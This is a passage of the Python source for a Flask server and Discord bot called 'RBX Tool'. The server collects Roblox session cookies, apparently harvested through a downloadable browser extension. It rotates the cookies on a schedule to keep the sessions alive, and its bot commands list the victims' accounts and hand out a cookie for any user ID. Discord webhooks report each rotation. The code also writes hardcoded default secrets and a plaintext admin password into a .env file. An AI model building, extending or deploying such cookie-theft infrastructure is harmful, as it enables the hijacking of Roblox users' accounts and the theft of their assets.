        
        logger.info("[DOWNLOAD] Extension file downloaded")
        return send_file(
            ext_file,
            mimetype='application/zip',
            as_attachment=True,
            download_name='rbx_extension.zip'
        )
    except Exception as e:
        logger.error(f"[DOWNLOAD] Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/sessions', methods=['GET'])
@login_required
def admin_sessions_api():
    if not ADMIN_PANEL_ENABLED:
        return admin_panel_disabled_response()
    """Return session metadata for admin dashboard without exposing cookie values."""
    sessions = db_list_sessions()
    now = datetime.now(timezone.utc)
    refresh_minutes = REFRESH_INTERVAL_MINUTES
    
    for s in sessions:
        s.pop('cookie', None)
        s.pop('previousCookie', None)

        # Calculate time since last update
        try:
            updated = datetime.fromisoformat(s['updatedAt'])
            if updated.tzinfo is None:
                updated = updated.replace(tzinfo=timezone.utc)
            age_seconds = (now - updated).total_seconds()
            s['ageSeconds'] = int(age_seconds)
            s['ageMinutes'] = round(age_seconds / 60, 1)
            s['ageHours'] = round(age_seconds / 3600, 2)
            # Time until next refresh (based on refresh interval)
            refresh_seconds = refresh_minutes * 60
            remaining = refresh_seconds - age_seconds
            s['refreshIn'] = max(0, int(remaining))
            s['needsRefresh'] = age_seconds >= refresh_seconds and s['status'] == 'ALIVE'
        except:
            s['ageSeconds'] = 0
            s['refreshIn'] = 0
            s['needsRefresh'] = False
    
    return jsonify({
        'count': len(sessions),
        'sessions': sessions,
        'config': {
            'refreshIntervalMinutes': refresh_minutes,
            'serverTime': now.isoformat()
        }
    })

@app.route('/api/admin/config', methods=['POST'])
@login_required
def update_admin_config():
    """Update admin configuration and reschedule jobs"""
    global REFRESH_INTERVAL_MINUTES, global_scheduler
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        new_interval = data.get('refreshIntervalMinutes')
        
        # Validate interval
        if new_interval is not None:
            try:
                new_interval = int(new_interval)
                if new_interval < 1 or new_interval > 1440:  # 1 min to 24 hours
                    return jsonify({'error': 'Interval must be between 1 and 1440 minutes'}), 400
            except (ValueError, TypeError):
                return jsonify({'error': 'Invalid interval'}), 400
        else:
            new_interval = REFRESH_INTERVAL_MINUTES
        
        old_interval = REFRESH_INTERVAL_MINUTES
        
        # Update global variable
        REFRESH_INTERVAL_MINUTES = new_interval
        
        logger.info(f"[CONFIG] Update: interval={old_interval}min→{new_interval}min")
        
        # Reschedule the job if interval changed and scheduler is running
        if global_scheduler and new_interval != old_interval:
            try:
                # Remove old job
                global_scheduler.remove_job('refresh_sessions')
                logger.info("[SCHEDULER] Removed old refresh job")
                
                # Add new job with new interval
                global_scheduler.add_job(
                    refresh_stale_sessions,
                    'interval',
                    minutes=new_interval,
                    id='refresh_sessions',
                    name='Refresh stale sessions'
                )
                logger.info(f"[SCHEDULER] Rescheduled refresh job to run every {new_interval} minutes")
            except Exception as e:
                logger.error(f"[SCHEDULER] Error rescheduling: {e}")
                return jsonify({'error': f'Failed to reschedule: {e}'}), 500
        
        # Send Discord notification for config update (via updates webhook)
        if DISCORD_WEBHOOK_URL_UPDATES:
            embed = {
                "title": "⚙️ CONFIGURATION UPDATED",
                "color": 0x8b5cf6,
                "fields": [
                    {"name": "🔄 Refresh Interval", "value": f"`{old_interval}` → `{new_interval}` minutes", "inline": True},
                    {"name": "⏰ Updated At", "value": datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC'), "inline": False},
                    {"name": "✅ Status", "value": "Applied immediately!", "inline": False},
                ],
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "footer": {"text": "RBX Tool - Admin Panel"}
            }
            payload = {"embeds": [embed]}
            try:
                http_requests.post(f"{DISCORD_WEBHOOK_URL_UPDATES}?wait=true", json=payload, timeout=10)
                logger.info("[CONFIG] Notification sent to updates webhook")
            except Exception as e:
                logger.error(f"[CONFIG] Failed to send webhook: {e}")
        
        # Return updated values
        return jsonify({
            'status': 'success',
            'message': f'✅ Configuration updated successfully!\n🔄 New refresh interval: {new_interval} minutes',
            'config': {
                'refreshIntervalMinutes': REFRESH_INTERVAL_MINUTES
            }
        }), 200
    except Exception as e:
        logger.error(f"[CONFIG] Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/admin/change-password', methods=['POST'])
@login_required
def change_admin_password():
    """Change admin password"""
    global ADMIN_PASSWORD
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        old_password = data.get('oldPassword', '').strip()
        new_password = data.get('newPassword', '').strip()
        confirm_password = data.get('confirmPassword', '').strip()
        
        # Validate old password
        if old_password != ADMIN_PASSWORD:
            logger.warning(f"[SECURITY] Failed password change attempt - incorrect old password")
            return jsonify({'error': 'Mật khẩu cũ không chính xác'}), 401
        
        # Validate new password
        if not new_password:
            return jsonify({'error': 'Mật khẩu mới không thể để trống'}), 400
        
        if len(new_password) < 6:
            return jsonify({'error': 'Mật khẩu mới phải có ít nhất 6 ký tự'}), 400
        
        # Confirm password match
        if new_password != confirm_password:
            return jsonify({'error': 'Xác nhận mật khẩu không khớp'}), 400
        
        # Prevent same password
        if new_password == old_password:
            return jsonify({'error': 'Mật khẩu mới không thể trùng với mật khẩu cũ'}), 400
        
        # Update password in memory
        ADMIN_PASSWORD = new_password
        
        # Save to .env file
        env_file = os.path.join(BASE_DIR, '.env')
        env_saved = False
        
        try:
            import re
            
            # Read existing .env or create new one
            if os.path.exists(env_file):
                with open(env_file, 'r', encoding='utf-8') as f:
                    env_content = f.read()
                logger.info(f"[SECURITY] Reading existing .env file")
            else:
                # Create new .env file with defaults
                env_content = f"""DISCORD_TOKEN=
DISCORD_WEBHOOK_URL=
DISCORD_WEBHOOK_URL_UPDATES=
API_KEY=rbx-secret-key-2024
ADMIN_USERNAME=admin
ADMIN_PASSWORD={new_password}
PORT=5000
REFRESH_INTERVAL_MINUTES=30
SECRET_KEY=rbx-secret-key-2024-session
"""
                logger.info(f"[SECURITY] Creating new .env file with updated password")
            
            # Update or add ADMIN_PASSWORD line
            if 'ADMIN_PASSWORD=' in env_content:
                old_line = re.search(r'ADMIN_PASSWORD=.*', env_content).group(0)
                env_content = env_content.replace(old_line, f'ADMIN_PASSWORD={new_password}')
                logger.info(f"[SECURITY] Updated existing ADMIN_PASSWORD line")
            else:
                env_content += f'\nADMIN_PASSWORD={new_password}'
                logger.info(f"[SECURITY] Added new ADMIN_PASSWORD line")
            
            # Write to file
            with open(env_file, 'w', encoding='utf-8') as f:
                f.write(env_content)
            
            env_saved = True
            logger.info(f"[SECURITY] Password successfully saved to {env_file}")
            
            # Verify file was written
            with open(env_file, 'r', encoding='utf-8') as f:
                verify_content = f.read()
                if f'ADMIN_PASSWORD={new_password}' in verify_content:
                    logger.info(f"[SECURITY] ✅ Verified: Password in .env file is correct")
                else:
                    logger.error(f"[SECURITY] ❌ Verification failed: Password not found in .env file")
                    env_saved = False
        
        except Exception as e:
            logger.error(f"[SECURITY] Failed to save password to .env: {e}")
            env_saved = False
        
        # Send Discord notification
        if DISCORD_WEBHOOK_URL_UPDATES:
            embed = {
                "title": "🔐 ADMIN PASSWORD CHANGED",
                "color": 0xf59e0b,
                "fields": [
                    {"name": "⏰ Changed At", "value": datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC'), "inline": False},
                    {"name": "💾 Saved to .env", "value": "✅ Yes" if env_saved else "⚠️ No (memory only)", "inline": False},
                    {"name": "⚠️ Important", "value": "🔄 Restart server to apply changes from .env file", "inline": False},
                ],
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "footer": {"text": "RBX Tool - Security"}
            }
            payload = {"embeds": [embed]}
            try:
                http_requests.post(f"{DISCORD_WEBHOOK_URL_UPDATES}?wait=true", json=payload, timeout=10)
            except Exception as e:
                logger.error(f"[SECURITY] Failed to send webhook: {e}")
        
        message = '✅ Mật khẩu admin đã được đổi thành công!\n'
        if env_saved:
            message += '💾 Đã lưu vào file .env\n'
        else:
            message += '⚠️ Lưu trong memory (nếu restart thì quay về default)\n'
        message += '🔒 Mật khẩu mới sẽ dùng ngay lập tức\n'
        message += '🔄 Nếu restart server, mật khẩu sẽ load từ .env file'
        
        return jsonify({
            'status': 'success',
            'message': message,
            'saved': env_saved
        }), 200
    
    except Exception as e:
        logger.error(f"[SECURITY] Error changing password: {e}")
        return jsonify({'error': str(e)}), 500

# =====================================================
# DISCORD BOT
# =====================================================
def start_discord_bot():
    """Run Discord bot in a separate thread"""
    import discord
    from discord import app_commands
    
    intents = discord.Intents.default()
    client = discord.Client(intents=intents)
    tree = app_commands.CommandTree(client)
    
    @client.event
    async def on_ready():
        logger.info(f"[DISCORD] Bot online: {client.user}")
        try:
            synced = await tree.sync()
            logger.info(f"[DISCORD] Synced {len(synced)} commands")
        except Exception as e:
            logger.error(f"[DISCORD] Sync error: {e}")
    
    # /ping
    @tree.command(name="ping", description="Check bot status")
    async def cmd_ping(interaction: discord.Interaction):
        alive = db_count_by_status('ALIVE')
        die = db_count_by_status('DIE')
        await interaction.response.send_message(
            f"Pong! {round(client.latency * 1000)}ms | ALIVE: {alive} | DIE: {die}"
        )
    
    # /alive
    @tree.command(name="alive", description="Count ALIVE sessions")
    async def cmd_alive(interaction: discord.Interaction):
        alive = db_count_by_status('ALIVE')
        total = len(db_list_sessions())
        await interaction.response.send_message(
            f"**{alive}** / {total} sessions are ALIVE"
        )
    
    # /all
    @tree.command(name="all", description="List all sessions")
    async def cmd_all(interaction: discord.Interaction):
        sessions = db_list_sessions()
        if not sessions:
            await interaction.response.send_message("No sessions found.")
            return
        
        embed = discord.Embed(title=f"All Sessions ({len(sessions)})", color=0x3b82f6)
        for idx, s in enumerate(sessions[:25], 1):  # Discord limit 25 fields, numbering from 1
            cookie_preview = s['cookie'][:20] + '...' if len(s['cookie']) > 20 else s['cookie']
            status_emoji = {'ALIVE': '🟢', 'DIE': '🔴', 'PAUSED': '🟡'}.get(s['status'], '⚪')
            embed.add_field(
                name=f"[{idx}] {status_emoji} {s['username']} (ID: {s['userId']})",
                value=f"🎮 {s['game']} | 🔄 Rotated: {s.get('refreshCount', 0)}x | ⏰ {s['updatedAt'][:16]}",
                inline=False
            )
        if len(sessions) > 25:
            embed.set_footer(text=f"Showing 25/{len(sessions)} sessions. Use /search to find specific account.")
        await interaction.response.send_message(embed=embed)
    
    # /cookie <userId>
    @tree.command(name="cookie", description="Get cookie by userId")
    @app_commands.describe(userid="Roblox User ID")
    async def cmd_cookie(interaction: discord.Interaction, userid: str):
        session = db_get_session(userid)
        if not session:
            await interaction.response.send_message(f"❌ No session found for ID: `{userid}`")
            return
        
        embed = discord.Embed(title=f"🔐 Cookie for {session['username']}", color=0x10b981)
        embed.add_field(name="📌 User ID", value=f"`{session['userId']}`", inline=True)
        embed.add_field(name="👤 Username", value=session['username'], inline=True)
        embed.add_field(name="🎮 Display", value=session.get('displayName', 'N/A'), inline=True)
        embed.add_field(name="📊 Status", value=f"{'🟢 ALIVE' if session['status'] == 'ALIVE' else '🔴 DIE' if session['status'] == 'DIE' else '🟡 PAUSED'}", inline=True)
        embed.add_field(name="🔄 Rotations", value=f"{session.get('refreshCount', 0)}x", inline=True)
        embed.add_field(name="⏰ Last Update", value=session['updatedAt'][:16], inline=True)
        encrypted_cookie = encrypt_sensitive_data(session.get('cookie', ''))
        embed.add_field(name="🪙 Cookie (Encrypted)", value=f"```{encrypted_cookie}```", inline=False)
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    # /search <query> - Search by username or ID
    @tree.command(name="search", description="Search account by username or ID")
    @app_commands.describe(query="Username or User ID to search")
    async def cmd_search(interaction: discord.Interaction, query: str):
        sessions = db_list_sessions()
        query_lower = query.lower()
        results = [s for s in sessions if query_lower in s.get('userId', '').lower() or query_lower in s.get('username', '').lower()]
        
        if not results:
            await interaction.response.send_message(f"❌ No accounts found matching: `{query}`")
            return
        
        embed = discord.Embed(title=f"🔍 Search Results ({len(results)})", color=0x3b82f6)
        for idx, s in enumerate(results[:10], 1):  # Limit to 10 results
            status_emoji = {'ALIVE': '🟢', 'DIE': '🔴', 'PAUSED': '🟡'}.get(s['status'], '⚪')
            embed.add_field(
                name=f"[{idx}] {status_emoji} {s['username']}",
                value=f"🆔 ID: `{s['userId']}`\n🎮 {s.get('game', 'N/A')} | 🔄 Rotations: {s.get('refreshCount', 0)}",
                inline=False
            )
        await interaction.response.send_message(embed=embed)
    
    # /refresh
    @tree.command(name="refresh", description="Force refresh all stale sessions")
    async def cmd_refresh(interaction: discord.Interaction):
        await interaction.response.defer()
        
        stale = db_get_stale_sessions()
        if not stale:
            await interaction.followup.send("✅ No stale sessions to refresh.")
            return
        
        await interaction.followup.send(f"🔄 **Refreshing {len(stale)} stale sessions...**\n⏳ Please wait...")
        
        # Collect refresh results
        results = {
            'success': [],
            'failed': [],
            'details': []
        }
        
        for session in stale:
            userId = session['userId']
            username = session['username']
            old_cookie = session['cookie']
            
            logger.info(f"[CRON] Refreshing {username} ({userId})...")
            new_cookie = rotate_cookie(old_cookie)
            
            if new_cookie:
                db_update_cookie(userId, new_cookie)
                # Verify account is still alive
                user_info = get_roblox_user_info(new_cookie)
                if user_info:
                    results['success'].append({
                        'userId': userId,
                        'username': username,
                        'displayName': user_info.get('displayName', 'N/A')
                    })
                    results['details'].append(f"✅ {username} (ID: `{userId}`) - Cookie rotated successfully")
                    # Send to updates webhook
                    send_simple_update_notification(userId, username, 'COOKIE_ROTATED')
                else:
                    db_update_status(userId, 'DIE')
                    results['failed'].append(userId)
                    results['details'].append(f"⚠️ {username} (ID: `{userId}`) - Cookie rotated but account verification FAILED - marked as DIE")
                    # Send status change notification
                    send_simple_update_notification(userId, username, 'STATUS_CHANGED')
                # Update Discord webhook (cookie notification)
                updated_session = db_get_session(userId)
                if updated_session and user_info:
                    send_discord_webhook(updated_session, is_update=True, update_type='COOKIE_ROTATED')
            else:
                db_update_status(userId, 'DIE')
                results['failed'].append(userId)
                results['details'].append(f"❌ {username} (ID: `{userId}`) - Rotation FAILED - marked as DIE")
                # Send status change notification
                send_simple_update_notification(userId, username, 'STATUS_CHANGED')
            
            time.sleep(1)  # Small delay between refreshes
        
        # Build result embed
        embed = discord.Embed(title="🔄 Refresh Complete", color=0x10b981 if results['success'] else 0xef4444)
        embed.add_field(name="✅ Successful", value=f"{len(results['success'])} accounts", inline=True)
        embed.add_field(name="❌ Failed", value=f"{len(results['failed'])} accounts", inline=True)
        
        # Add details
        for detail in results['details'][:10]:  # Limit to 10
            embed.description = embed.description or ""
            embed.description += detail + "\n"
        
        if len(results['details']) > 10:
            embed.description += f"\n... and {len(results['details']) - 10} more"
        
        alive = db_count_by_status('ALIVE')
        die = db_count_by_status('DIE')
        embed.set_footer(text=f"Total: 🟢 ALIVE: {alive} | 🔴 DIE: {die}")
        
        await interaction.followup.send(embed=embed)
    
    # /update <userId> <status>
    @tree.command(name="update", description="Update session status")
    @app_commands.describe(userid="Roblox User ID", status="New status")
    @app_commands.choices(status=[
        app_commands.Choice(name="ALIVE", value="ALIVE"),
        app_commands.Choice(name="PAUSED", value="PAUSED"),
        app_commands.Choice(name="DIE", value="DIE"),
    ])
    async def cmd_update(interaction: discord.Interaction, userid: str, status: app_commands.Choice[str]):
        session = db_get_session(userid)
        if not session:
            await interaction.response.send_message(f"❌ No session found: `{userid}`")
            return
        old_status = session['status']
        username = session.get('username', 'unknown')
        db_update_status(userid, status.value)
        
        # Send status change notification (via updates webhook)
        if old_status != status.value:
            send_simple_update_notification(userid, username, 'STATUS_CHANGED')
        
        await interaction.response.send_message(
            f"✅ Updated **{username}** (ID: `{userid}`)\n{old_status} → **{status.value}**"
        )
    
    # /delete <userId>
    @tree.command(name="delete", description="Delete a session")
    @app_commands.describe(userid="Roblox User ID")
    async def cmd_delete(interaction: discord.Interaction, userid: str):
        session = db_get_session(userid)
        if not session:
            await interaction.response.send_message(f"No session found: {userid}")
            return
        db_delete_session(userid)
        await interaction.response.send_message(
            f"Deleted session: **{session['username']}** ({userid})"
        )
    
    # /help
    @tree.command(name="help", description="Show all commands")
    async def cmd_help(interaction: discord.Interaction):
        embed = discord.Embed(title="📚 RBX Tool Commands", color=0x3b82f6)
        commands_list = [
            ("/ping", "🏓 Check bot status + session counts"),
            ("/alive", "🟢 Count ALIVE sessions"),
            ("/all", "📋 List all sessions (with numbering)"),
            ("/search <query>", "🔍 Search account by username or ID"),
            ("/cookie <userId>", "🔐 Get full cookie for a user"),
            ("/refresh", "🔄 Force refresh all stale sessions (with health check)"),
            ("/update <userId> <status>", "✏️ Change session status (ALIVE/PAUSED/DIE)"),
            ("/delete <userId>", "🗑️ Delete a session permanently"),
            ("/help", "📚 Show this help message"),
        ]
        for name, desc in commands_list:
            embed.add_field(name=name, value=desc, inline=False)
        embed.set_footer(text="💡 Use /search to find a specific account by ID or username")
        await interaction.response.send_message(embed=embed)
    
    # Run bot
    try:
        client.run(DISCORD_TOKEN, log_handler=None)
    except Exception as e:
        logger.error(f"[DISCORD] Bot error: {e}")

# =====================================================
# MAIN - Start everything
# =====================================================
if __name__ == '__main__':
    # 1. Init database
    init_db()
    
    # 2. Setup images
    setup_images()
    
    # 3. Start cron scheduler
    global_scheduler = start_scheduler()
    
    # 4. Start Discord bot in background thread
    if DISCORD_TOKEN:
        discord_thread = threading.Thread(target=start_discord_bot, daemon=True)
        discord_thread.start()
        logger.info("[MAIN] Discord bot thread started")
    else:
        logger.warning("[MAIN] No DISCORD_TOKEN - bot disabled")
    
    # 5. Start Flask web server
    logger.info(f"[MAIN] Starting Flask server on port {PORT}")
    logger.info(f"[MAIN] Cron: every {REFRESH_INTERVAL_MINUTES}min")
    logger.info(f"[MAIN] Webhook: {'configured' if DISCORD_WEBHOOK_URL else 'NOT configured'}")
    logger.info("[MAIN] System ready!\n")
    
    app.run(debug=False, host='0.0.0.0', port=PORT)
